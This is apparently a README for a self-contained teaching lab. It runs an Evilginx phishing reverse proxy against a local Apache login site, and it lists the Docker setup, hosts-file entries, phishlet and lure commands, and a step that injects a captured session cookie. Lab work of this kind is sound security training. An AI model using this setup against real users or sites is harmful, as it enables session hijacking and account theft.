## Objective
Intercept the authentication tokens needed to hijack the user's session. 

## Build & run the containers
- Install Docker (Linux, Windows)
- Start docker (bij boot)
- Download/clone this repo (wget, git, ...)
- Build/start Docker containers
- verify if docker containers are running

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable docker --now
sudo docker-compose up --build -d --force-recreate --remove-orphans
sudo docker ps
```
You will now have two Docker Containers:
- Evilginx Lab (PXL-EVIL)
- Apache webserver (PXL)

## Edit locahost
- Add lines to hosts file (/etc/hosts)

```bash
	127.0.0.1 fake.local login.fake.local
	::1 fake.local login.fake.local
	127.0.0.1 pxl.local login.pxl.local
	::1 pxl.local login.pxl.local
```

The 'normal' Apache site should work at: https://pxl.local:8443
Try to log-on (see login-config.php)

## Evilginx
- Connect to Evilginix container 
- Start Evilginx in developer mode (required for certificates)

```bash
sudo docker exec -it /PXL-EVIL /bin/bash
./evilginx2 -developer
```

## Config Evilginx
```bash  
: config domain fake.local
: config ipv4 172.18.0.10
: phishlets hostname pxl fake.local

: phishlets get-hosts pxl
	172.18.0.10 login.fake.local
	172.18.0.10 fake.local
	
: phishlets enable pxl
: lures create pxl
: lures get-url 0
```

## Test
- Login, test!
- Inject Cookie using StorageAce

```bash
sessions
```


## Troubleshooting
- Start Evilginx with Debug: **./evilginx2 -developer -debug**
- Stop all containers: **docker stop $(docker ps -aq)**
- Remove all containers: **docker rm $(docker ps -aq)**
- Prune networks: **docker network prune**
